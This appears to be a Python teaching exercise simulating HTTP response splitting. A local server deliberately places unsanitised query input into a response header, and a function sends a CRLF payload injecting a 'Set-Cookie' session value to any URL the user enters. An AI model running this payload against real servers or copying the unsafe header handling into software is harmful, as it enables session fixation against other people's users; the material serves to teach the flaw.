# - Topics:
# - Understand HTTP response splitting and how it can lead to security issues like session fixation.
# - Project:
# - Write a script that simulates HTTP response splitting
# - by injecting malicious headers into HTTP responses.




import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, unquote
import threading

# Part 1: Vulnerable Server
class VulnerableHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Extract user input from the query parameter "data"
        query = urlparse(self.path).query
        params = dict(pair.split('=') for pair in query.split('&') if '=' in pair)
        user_input = unquote(params.get('data', ''))  # Decode URL-encoded input

        # Inject user input into a header (simulating vulnerable code)
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('X-Vulnerable-Header', user_input)  # Unsafe!
        self.end_headers()

        # Response body
        self.wfile.write(b"HTTP Response Splitting Simulation")

def start_vulnerable_server(host='localhost', port=8080):
    server = HTTPServer((host, port), VulnerableHandler)
    print(f"Vulnerable server running on http://{host}:{port}")
    server.serve_forever()

# Part 2: Attack Simulation
def exploit_response_splitting(target_url):
    # Craft a payload with CRLF to split the response
    payload = "malicious%0d%0aSet-Cookie:%20sessionid=1234"  # %0d%0a = \r\n

    # Send the exploit
    url = f"{target_url}?data={payload}"
    response = requests.get(url)

    # Check if the injected cookie is reflected
    print("\nResponse Headers:")
    for header, value in response.headers.items():
        print(f"{header}: {value}")

    if 'Set-Cookie' in response.headers:
        print("\n[+] Exploit succeeded! Injected cookie:", response.headers['Set-Cookie'])
    else:
        print("\n[-] Server is not vulnerable")

# Main Function
def main():
    # Start the vulnerable server in a separate thread
    server_thread = threading.Thread(target=start_vulnerable_server)
    server_thread.daemon = True
    server_thread.start()

    # Ask the user for the target URL
    target_url = input("Enter the target URL (e.g., http://localhost:8080): ").strip()
    if not target_url:
        target_url = "http://localhost:8080"  # Default to local server

    # Simulate the attack
    exploit_response_splitting(target_url)

if __name__ == "__main__":
    main()